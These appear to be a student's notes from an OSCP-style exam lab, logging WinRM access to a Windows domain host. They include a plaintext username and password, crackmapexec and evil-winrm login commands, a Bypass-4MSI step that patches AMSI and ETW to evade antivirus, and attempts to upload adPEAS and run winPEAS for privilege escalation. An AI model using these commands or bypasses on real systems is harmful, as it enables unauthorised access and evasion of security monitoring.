# Info  

```
WinRM was possibly detected running on tcp port 5985.

192.168.114.206
domain: oscp.exam 
Username: r.andrews
Password: BusyOfficeWorker890


crackmapexec winrm 192.168.114.206 -d 'oscp.exam' -u 'r.andrews' -p 'BusyOfficeWorker890'

evil-winrm -u 'r.andrews' -p 'BusyOfficeWorker890' -i 192.168.114.206
```

![[{9B55F53D-AA74-45EA-B0B1-DE3501603A33}.png]]

route print
 
![[{9FDEC911-B21A-48CF-8B4C-8076E011DFEF}.png]]

Get-Process
```
*Evil-WinRM* PS C:\Users\r.andrews\Documents> Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    176      11     3612      11300               988   0 AggregatorHost
    468      20     1804       5864               516   0 csrss
    164      11     1664       5476               624   1 csrss
    352      16     2884      15608              3724   1 ctfmon
    273      15     3940      14948              3716   0 dllhost
    708      26    20672      49088               808   1 dwm
     42       6     1528       4116               912   0 fontdrvhost
     42       6     1496       4148               920   1 fontdrvhost
      0       0       60          8                 0   0 Idle
    757      36    13868      56188              1128   1 LogonUI
   1881      35     7948      26064               764   0 lsass
      0       0       40          0              2176   0 Memory Compression
    222      14     1996       5044              1620   0 MicrosoftEdgeUpdate
    343      18    10508      27952              5148   0 MoUsoCoreWorker
    237      14     2776      10952              3896   0 msdtc
      0      12     2548      12120                92   0 Registry
    673      19    13612      25556              5840   0 SearchIndexer
    582      13     4648      10016               732   0 services
     58       3     1056       1208               376   0 smss
    291      12     2468       9656               464   0 svchost
    168      10     2128      10484               528   0 svchost
   1023      17     5940      17496               876   0 svchost
    804      16     4504      11656               996   0 svchost
    552      20     5036      15556              1076   0 svchost
    127       7     1212       6048              1084   0 svchost
    162      11     1664       7576              1132   0 svchost
    358      19     6140      23572              1136   0 svchost
    130      17     3888       8396              1164   0 svchost
    248       8     1344       6364              1232   0 svchost
    202      11     1788       9124              1264   0 svchost
    308      16     3228      10228              1364   0 svchost
    833      21     5076      17392              1392   0 svchost
    121       8     1224       7136              1416   0 svchost
    222      10     1936       7476              1440   0 svchost
    214      14    53868      60820              1496   0 svchost
    427      33    14188      24784              1592   0 svchost
    169      10     1776       7692              1704   0 svchost
    213      13     1656       8136              1712   0 svchost
    262      13     3276      10588              1812   0 svchost
    174      10     1472       7696              1856   0 svchost
    124       8     1148       5820              1924   0 svchost
    355      14    13700      18212              1932   0 svchost
    229      13     2708      12620              2008   0 svchost
    432      10     2732       9416              2036   0 svchost
    391      19     6012      16960              2072   0 svchost
    146       8     1256       6444              2196   0 svchost
    160      10     1608       8276              2236   0 svchost
    264       9     3968      11332              2276   0 svchost
    223      12     2000       9568              2288   0 svchost
    152      10     1444       7680              2312   0 svchost
    286      13     3060      11788              2328   0 svchost
    166      10     1768       8688              2352   0 svchost
    286      16     3720      16452              2436   0 svchost
    193      10     1668       8640              2456   0 svchost
    249      16     2260      11148              2476   0 svchost
    141       8     1320       6472              2612   0 svchost
    217      12     2284       9528              2636   0 svchost
    150       9     1336       6752              2644   0 svchost
    442      13     2376      10476              2652   0 svchost
    157       9     1708       8792              2756   0 svchost
    376      16     2844      12324              2764   0 svchost
    182      11     1828       8904              2776   0 svchost
    410      27     8840      20540              2956   0 svchost
    623      27    19572      44960              2964   0 svchost
    355      17     8752      15040              3008   0 svchost
    136       8     1192       5804              3076   0 svchost
    415      17     9580      19940              3140   0 svchost
    374      17     4056      18092              3172   0 svchost
    325      15     3516      15240              4076   0 svchost
    210      11     2516      12416              4252   0 svchost
    213      11     1780       8500              4408   0 svchost
    456      28     9156      20412              4712   0 svchost
    143       9     1504       8328              4740   0 svchost
    290      17     3736      18696              4764   0 svchost
    344      19     4096      17136              4952   0 svchost
    213      16     6304      10960              5060   0 svchost
    222      15     1948       7744              5352   0 svchost
    196      12     2128      11088              5448   0 svchost
    265      20     3172      13588              5676   0 svchost
    120       8     1276       5716              6196   0 svchost
   1929       0       40        144                 4   0 System
    125       7     1308       6372              4352   0 uhssvc
    178      12     2892      12292              3084   0 VGAuthService
    130       8     1464       6608              3096   0 vm3dservice
    130       9     1592       7048              3292   1 vm3dservice
    427      25    11056      23664              3112   0 vmtoolsd
    132      11     1280       7180               616   0 wininit
    224      13     2472      17616               712   1 winlogon
    409      19    11424      24076              3908   0 WmiPrvSE
    643      29    68308      88752       1.09   5660   0 wsmprovhost

```

whoanmi /priv

```
*Evil-WinRM* PS C:\windows> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled

```

whoami /all

```
*Evil-WinRM* PS C:\Users\r.andrews\Documents> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ==============================================
oscp\r.andrews S-1-5-21-2468442526-2906141135-4054829294-1105


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.


```

whoami /user
```
*Evil-WinRM* PS C:\Users\r.andrews\Documents> whoami /user

USER INFORMATION
----------------

User Name      SID
============== ==============================================
oscp\r.andrews S-1-5-21-2468442526-2906141135-4054829294-1105

```


hostname
```
*Evil-WinRM* PS C:\windows> systeminfo
systeminfo.exe : ERROR: Access denied
    + CategoryInfo          : NotSpecified: (ERROR: Access denied:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
*Evil-WinRM* PS C:\windows> hostname
WS26
*Evil-WinRM* PS C:\windows> 

```

get file from vm
upload ADpeas and it not working

```
[+] Success!
*Evil-WinRM* PS C:\Users\r.andrews\Documents> 
*Evil-WinRM* PS C:\Users\r.andrews\Documents> ls
*Evil-WinRM* PS C:\Users\r.andrews\Documents> upload /home/kali/OSCP/Exam/AD/192.168.114.206/adPEAS/adPEAS.ps1
                                        
Info: Uploading /home/kali/OSCP/Exam/AD/192.168.114.206/adPEAS/adPEAS.ps1 to C:\Users\r.andrews\Documents\adPEAS.ps1
                                        
Data: 6249928 bytes of 6249928 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\r.andrews\Documents> ls


    Directory: C:\Users\r.andrews\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/12/2024   6:36 AM        4687448 adPEAS.ps1


*Evil-WinRM* PS C:\Users\r.andrews\Documents> ./adPEAS.ps1
File C:\Users\r.andrews\Documents\adPEAS.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1
+ ./adPEAS.ps1
+ ~~~~~~~~~~~~
    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess
*Evil-WinRM* PS C:\Users\r.andrews\Documents> menu
                                        

```
can do anything as user got no permission, script is disabled for this system, maybe winpeas might work

```

┌──(kali㉿kali)-[~/OSCP/Exam/AD/192.168.114.206]
└─$ evil-winrm -u 'r.andrews' -p 'BusyOfficeWorker890' -i 192.168.114.206 -e /home/kali/OSCP/Exam/AD/192.168.114.206  
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\r.andrews\Documents> Bypass-4MSI  
Warning: AV could be still watching for suspicious activity. Waiting for patching...  
Info: Patching 4MSI, please be patient...
[+] Success!   
Info: Patching ETW, please be patient ..    
[+] Success!
*Evil-WinRM* PS C:\Users\r.andrews\Documents> menu 
Info: Bypass-4MSI is loaded. Trying to load utilities


   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Dll-Loader
[+] Donut-Loader
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit

*Evil-WinRM* PS C:\Users\r.andrews\Documents> Invoke-Binary /home/kali/OSCP/Exam/AD/192.168.114.206/winPEASx64.exe    
Error: Check filenames
*Evil-WinRM* PS C:\Users\r.andrews\Documents> 

```

cant run exe file GG


Get services 
```

*Evil-WinRM* PS C:\Users\r.andrews\Documents> services

Path                                                                                    Privileges Service                      
----                                                                                    ---------- -------                      
"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc                   False edgeupdate                   
"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc                False edgeupdatem                  
"C:\Program Files (x86)\Microsoft\Edge\Application\130.0.2849.80\elevation_service.exe"      False MicrosoftEdgeElevationService
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                 True NetTcpPortSharing            
C:\Windows\SysWow64\perfhost.exe                                                             False PerfHost                     
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                   False Sense                        
C:\Windows\servicing\TrustedInstaller.exe                                                    False TrustedInstaller             
"C:\Program Files\Microsoft Update Health Tools\uhssvc.exe"                                  False uhssvc                       
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                       False VGAuthService                
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                          False VMTools                      
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                         False WMPNetworkSvc   
```

exe files ?

```
Volume serial number is 121B-EA21
C:.
¦   bfsvc.exe
¦   CloudEdition.xml
¦   DtcInstall.log
¦   Education.xml
¦   Enterprise.xml
¦   explorer.exe
¦   HelpPane.exe
¦   hh.exe
¦   IoTEnterprise.xml
¦   lsasetup.log
¦   mib.bin
¦   notepad.exe
¦   PFRO.log
¦   Professional.xml
¦   ProfessionalCountrySpecific.xml
¦   ProfessionalEducation.xml
¦   ProfessionalSingleLanguage.xml
¦   ProfessionalWorkstation.xml
¦   regedit.exe
¦   ServerRdsh.xml
¦   setupact.log
¦   setuperr.log
¦   splwow64.exe
¦   system.ini
¦   twain_32.dll
¦   win.ini
¦   WindowsUpdate.log
¦   winhlp32.exe
¦   WMSysPr9.prx
¦   write.exe

```